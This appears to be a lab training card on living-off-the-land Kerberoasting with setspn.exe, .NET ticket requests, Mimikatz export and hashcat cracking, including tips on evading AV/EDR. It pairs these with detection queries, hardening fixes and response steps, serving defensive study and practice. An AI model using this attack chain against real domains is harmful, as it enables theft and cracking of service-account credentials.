name: setspn - Semi-Manual Kerberoast
description: Native Windows tool to list all SPNs in the domain. Combined with .NET KerberosRequestorSecurityToken and Mimikatz kerberos::list /export, enables Kerberoasting with zero offensive tooling - pure living-off-the-land. Useful when Rubeus/PowerView are blocked.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== LIVING OFF THE LAND: THE FULL CHAIN ===
This approach uses ONLY built-in Windows tools - no offensive binaries needed.
Steps:

STEP 1 - List all SPNs:
  setspn.exe -Q */*
  setspn.exe -T INLANEFREIGHT.LOCAL -Q */*

STEP 2 - Request ticket for specific SPN via .NET (PowerShell):
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
    -ArgumentList 'MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433'
  This requests the TGS and caches it in the Kerberos ticket cache.

STEP 3 - Export all tickets to disk with Mimikatz:
  mimikatz: kerberos::list /export
  Creates .kirbi files in current directory

STEP 4 - Convert .kirbi to hashcat format:
  Base64 encode: base64 /out:true then kerberos::list /export
  echo '<base64>' | tr -d '\n' | base64 -d > sqldev.kirbi
  python2.7 kirbi2john.py sqldev.kirbi > crack_file
  sed 's/\$krb5tgs\$(.*):(.*)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_hashcat

STEP 5 - Crack:
  hashcat -m 13100 sqldev_hashcat /usr/share/wordlists/rockyou.txt

=== WHEN TO USE THIS APPROACH ===
  - Rubeus.exe is flagged by AV/EDR
  - PowerView import is blocked
  - You're on a restricted system with only cmd.exe + PowerShell available
  - LOTL detection gaps make this stealthier in some environments

=== ONE-LINER TO REQUEST ALL SPN TICKETS AT ONCE ===
  setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |
    Select-String '^CN' -Context 0,1 |
    % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
      -ArgumentList $_.Context.PostContext[0].Trim() }
  Then: mimikatz kerberos::list /export

defense.why_it_works: In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account - however low-privileged - can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. setspn -Q lists registered SPNs (readable), revealing which accounts are Kerberoastable.
defense.impact: The SPN inventory (roasting targets) gathered with a trusted built-in.
defense.detection: [MITRE T1558.003] LDAP queries filtering on servicePrincipalName / userAccountControl (Event 4662; Defender for Identity recon); one host reading roastable-account attributes. setspn.exe execution in process logs (4688).
defense.artifacts: setspn.exe command line; LDAP SPN query.
defense.splunk_spl:
index=sysmon EventCode=1 Image="*setspn.exe" CommandLine="*-Q*"
| table _time, Computer, User, CommandLine

index=wineventlog sourcetype="WinEventLog:Security" EventCode=4662 Properties="*servicePrincipalName*"
| table _time, Computer, Account_Name
defense.sentinel_kql:
DeviceProcessEvents
| where FileName =~ "setspn.exe" and ProcessCommandLine has "-Q"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp desc
defense.prevention: Use 100+ character passwords or gMSA for service accounts; disable RC4 (force AES); audit and remove unused SPNs; deploy honeypot SPN accounts to catch roasting; Defender for Identity flags mass TGS requests.
defense.evasion: setspn.exe is a trusted built-in, blending better than PowerView/Rubeus.
defense.misconfiguration: Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords - or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).
defense.vulnerable_config:
# Service account set up manually with a weak password + SPN
# Attacker can find these with:
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet

# Bad state - password set 4 years ago, RC4 permitted:
# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433
# RC4 (0x17) requested in TGS ticket - short hash, GPU-crackable

# Confirming RC4 is available:
Get-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes
# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)
defense.secure_config:
# Fix 1 - Use Group Managed Service Accounts (gMSA): 240-char random passwords,
# auto-rotated by AD, no human ever knows the password
New-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \
    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'
Install-ADServiceAccount gmsa_sql

# Fix 2 - For legacy accounts that must keep SPNs:
# Set a 100+ character random password (AD max is 127 chars):
$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)
Set-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)

# Fix 3 - Disable RC4, require AES-only:
Set-ADUser svc_sql -KerberosEncryptionType AES128,AES256
# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Microsoft Defender for Endpoint, Sysmon, Windows Security Event Log for surrounding context (5 min before/after)
Check for credential dumping artifacts (LSASS access, SAM hive reads, Kerberos anomalies)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Lists domain SPNs with the native Windows tool (living-off-the-land Kerberoasting):
  setspn.exe -Q */*        query for all SPNs in the domain (-L <account> for one account, -T <forest> for forest-wide)
Combined with .NET's KerberosRequestorSecurityToken (to request the ticket) and Mimikatz kerberos::list /export (to extract it), you can Kerberoast with zero third-party offensive tooling.
